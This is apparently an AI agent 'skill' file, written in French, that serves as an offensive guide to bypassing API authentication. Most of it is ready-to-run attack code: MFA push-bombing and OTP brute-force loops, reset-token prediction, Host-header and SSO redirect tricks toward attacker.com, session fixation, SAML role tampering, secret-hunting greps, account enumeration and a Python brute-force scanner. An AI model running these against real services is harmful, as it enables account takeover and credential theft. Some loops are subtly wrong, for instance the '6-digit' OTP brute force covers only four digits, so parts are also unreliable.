---
name: api-authentication-bypass
description: Techniques avancées de contournement d'authentification API — MFA bypass, OTP bruteforce, session hijacking, password reset abuse, magic link interception, SSO misconfiguration, et token theft
category: cybersecurite
---

# API Authentication Bypass — Guide Avancé

## Introduction

L'authentification API est le premier rempart. Au-delà du JWT, les attaques modernes ciblent le MFA, les OTP, les tokens de reset, les magic links, et les flux SSO/OAuth. Ce skill couvre les techniques au-delà des attaques JWT de base.

## 1. MFA (Multi-Factor Authentication) Bypass

### 1.1 MFA Fatigue (Push Bombing)

```bash
# Envoyer N notifications push pour lasser l'utilisateur
for i in $(seq 1 100); do
  curl -X POST https://api.target.com/api/v1/auth/mfa/request \
    -H "Authorization: Bearer <token>" \
    -d '{"method": "push"}'
done
```

### 1.2 MFA Bruteforce (OTP à 6 chiffres)

```bash
# Si pas de rate limit sur le MFA
# 10 000 combinaisons possibles
for code in $(seq 0 9999); do
  code=$(printf "%04d" $code)
  curl -X POST https://api.target.com/api/v1/auth/mfa/verify \
    -H "Authorization: Bearer <partial_token>" \
    -d '{"code":"'$code'","trust_device":false}'
done

# Version parallélisée
seq 0 9999 | xargs -P 50 -I {} curl -s -X POST \
  https://api.target.com/api/v1/auth/mfa/verify \
  -H "Authorization: Bearer <partial_token>" \
  -d '{"code":"'$(printf "%04d" {})'"}'
```

### 1.3 MFA Step Bypass

```bash
# Sauter l'étape MFA en manipulant le flux
# 1. Login normal → password OK → attend MFA
# 2. Au lieu de /mfa/verify, appeler directement /profile
curl -X GET https://api.target.com/api/v1/profile \
  -H "Authorization: Bearer <token_avant_MFA>"

# Changer le statut MFA dans la requête
POST /api/v1/auth/login
{"user":"admin","pass":"correct","mfa_required":false}

# Compléter login sans MFA
POST /api/v1/auth/login
{"user":"admin","pass":"correct","mfa_code":"000000"}
```

### 1.4 MFA via OAuth Token Reuse

```bash
# Si le token OAuth est émis avant MFA, l'utiliser directement
curl -X GET https://api.target.com/api/v1/admin \
  -H "Authorization: Bearer <oauth_token_avant_mfa>"
```

## 2. OTP (One-Time Password) Attacks

### 2.1 OTP Prediction

```bash
# Analyser la génération d'OTP
# Collecter plusieurs OTP pour trouver un pattern
for i in $(seq 1 20); do
  curl -X POST https://api.target.com/api/v1/auth/request-otp \
    -d '{"phone":"+33612345678"}'
  sleep 30
  # Lire l'OTP depuis les logs ou le canal
done

# OTP basé sur timestamp
# Si OTP = sha256(timestamp)[:6], on peut prédire
```

### 2.2 OTP Length Extension

```bash
# OTP court (4 chiffres = 10 000 combinaisons)
# OTP alphanumérique (6 chars = 2.1B combinaisons ≠ 10K)
# Vérifier la longueur réelle
POST /api/v1/auth/verify-otp
{"phone":"+33612345678","code":"0000"}  → 401
{"phone":"+33612345678","code":"000000"} → 401
{"phone":"+33612345678","code":"0000000"} → 200 (si accepte plus long)
```

### 2.3 OTP Channel Interception

```bash
# OTP envoyé dans la réponse API (OOB)
POST /api/v1/auth/request-otp
→ Réponse: {"otp":"4821","expires_in":300}  # OTP dans la réponse !

# OTP dans les headers de réponse
POST /api/v1/auth/request-otp
→ X-OTP-Code: 4821
```

## 3. Password Reset Abuse

### 3.1 Token Prediction

```bash
# Reset token basé sur timestamp
TOKEN=$(curl -s -D - https://api.target.com/api/v1/auth/reset-password \
  -X POST -d '{"email":"admin@target.com"}' \
  | grep -i location | grep -o 'token=[^&]*')

# Token = base64(timestamp): décoder
echo $TOKEN | base64 -d 2>/dev/null

# Token = md5(timestamp): générer les tokens
for ts in $(seq $(date +%s -d '-1 hour') $(date +%s)); do
  echo -n "$ts" | md5sum | awk '{print $1}'
done > tokens.txt
```

### 3.2 Host Header Injection

```bash
# Si le lien de reset inclut l'Host header
POST /api/v1/auth/reset-password
Host: target.com
{"email":"admin@target.com"}

# Attaquant modifie Host
POST /api/v1/auth/reset-password
Host: attacker.com
{"email":"admin@target.com"}
# → Le lien de reset pointe vers attacker.com
```

### 3.3 Token Reuse / No Expiry

```bash
# 1. Réinitialiser le mot de passe
# 2. Utiliser l'ancien lien de reset
curl -X POST https://api.target.com/api/v1/auth/reset/confirm \
  -d '{"token":"<old_token>","new_password":"hacked123"}'
```

## 4. Session Management Attacks

### 4.1 Session Fixation

```bash
# Forcer un session ID connu
GET /api/v1/auth/login?session_id=attacker_session_123
# Victime se connecte avec ce session_id
# Rejoindre avec le même session_id
curl -X GET https://api.target.com/api/v1/profile \
  -H "Cookie: session_id=attacker_session_123"
```

### 4.2 Session ID in URL

```bash
# Session ID leaké via Referer
GET /api/v1/transfer?session=abc123
# Si l'API logue l'URL, et l'admin clique → Referer: /api/v1/transfer?session=abc123

# Session ID dans les logs
# Analyser les logs d'erreur
GET /api/v1/admin?debug=true&session=admin123
```

### 4.3 No Session Expiry

```bash
# Token qui n'expire jamais
# 1. Capturer token
# 2. Logout
# 3. Réutiliser l'ancien token
curl -X GET https://api.target.com/api/v1/profile \
  -H "Authorization: Bearer <old_token>"  # 200 si non révoqué
```

## 5. Magic Link Abuse

```bash
# Magic link dans la réponse
POST /api/v1/auth/magic-link
{"email":"admin@target.com"}
→ Réponse: {"magic_link":"https://target.com/auth/confirm?code=abc123"}

# Magic link bruteforce
# Si code = 6 chars hex → 16M combinaisons
for code in $(seq 0 65535); do
  hex=$(printf "%04x" $code)
  curl -s https://target.com/auth/confirm?code=$hex
done

# Magic link reuse
# Utiliser le même lien plusieurs fois (si pas de one-time)
```

## 6. SSO / OAuth Authentication Bypass

### 6.1 Open Redirect via SSO

```bash
# SSO redirect_uri bypass
GET /api/v1/auth/sso/login?redirect_uri=https://attacker.com/steal
# Si l'API ne valide pas strictement le redirect_uri

# SSO callback manipulation
POST /api/v1/auth/sso/callback
{"code":"<auth_code>","state":"<state>","redirect_uri":"https://attacker.com"}
```

### 6.2 SAML Assertion Injection

```bash
# SAML XML signature wrapping
# Modifier l'assertion SAML pour usurper le rôle
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>admin@target.com</saml:NameID>  # Changer l'utilisateur
  </saml:Subject>
  <saml:AttributeStatement>
    <saml:Attribute Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue>  # Changer le rôle
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
```

## 7. API Key Hardcoded

```bash
# Recherche de clés API dans le code source
# Mobile apps, JS files, configs exposés
grep -r "api_key\|api-key\|apikey\|secret\|token" --include="*.js" --include="*.json"
grep -r "sk-[a-zA-Z0-9]\{32,\}" --include="*.env" --include="*.py"
grep -r "ghp_[a-zA-Z0-9]\{36\}" --include="*.js" --include="*.txt"
```

## 8. Account Enumeration

```bash
# Différence de message d'erreur
POST /api/v1/auth/login
{"user":"exists@target.com","pass":"wrong"}  → "Mot de passe incorrect"
{"user":"notexists@target.com","pass":"wrong"}  → "Utilisateur non trouvé"

# Timing difference
time curl -X POST https://api.target.com/api/v1/auth/login \
  -d '{"user":"exists@target.com","pass":"wrong"}'
# Si le temps de réponse diffère, l'utilisateur existe

# Reset password message
POST /api/v1/auth/reset-password
{"email":"exists@target.com"}  → "Email envoyé"
{"email":"fake@target.com"}  → "Email non trouvé"
```

## Script Automatisé

```python
#!/usr/bin/env python3
"""API Authentication Bypass Scanner."""
import requests
import string
import itertools

BASE = "https://api.target.com"

def test_mfa_bypass(token):
    """Teste les bypass MFA courants."""
    endpoints = ["/api/v1/profile", "/api/v1/dashboard", "/api/v1/admin"]
    for ep in endpoints:
        for header, value in [
            ("X-MFA-Status", "bypass"),
            ("X-Force-Auth", "true"),
            ("X-Skip-MFA", "1"),
        ]:
            r = requests.get(BASE + ep, headers={
                "Authorization": f"Bearer {token}",
                header: value
            })
            if r.status_code == 200:
                print(f"[MFA BYPASS] {ep} via {header}: {value}")

def test_otp_bruteforce(phone, digits=4):
    """Bruteforce OTP court."""
    for code in range(10**digits):
        code_str = str(code).zfill(digits)
        r = requests.post(BASE + "/api/v1/auth/verify-otp", json={
            "phone": phone, "code": code_str
        })
        if r.status_code == 200:
            print(f"[OTP BYPASS] Code: {code_str}")
            return code_str
        if code % 1000 == 0:
            print(f"[*] {code}/{10**digits}")
    return None
```

## Checklist

- [ ] MFA fatigue / push bombing
- [ ] MFA OTP bruteforce
- [ ] MFA step bypass (sauter l'étape)
- [ ] OTP dans la réponse API
- [ ] OTP prediction (timestamp-based)
- [ ] Reset token prediction
- [ ] Reset token reuse
- [ ] Host header injection (reset link)
- [ ] Session fixation
- [ ] Session ID in URL
- [ ] No session expiry / revocation
- [ ] Magic link in response
- [ ] Magic link bruteforce
- [ ] SSO redirect_uri bypass
- [ ] SAML assertion injection
- [ ] API key hardcoded
- [ ] Account enumeration via messages
- [ ] Timing-based enumeration

## Ressources

- **PortSwigger Authentication** : https://portswigger.net/web-security/authentication
- **HackTricks Auth Bypass** : https://book.hacktricks.wiki/en/pentesting-web/login-bypass/index.html
- **MFA Bypass Techniques** : https://www.cyberark.com/resources/threat-research-blog/the-ultimate-guide-to-mfa-bypass-techniques
- **OWASP Auth Cheatsheet** : https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html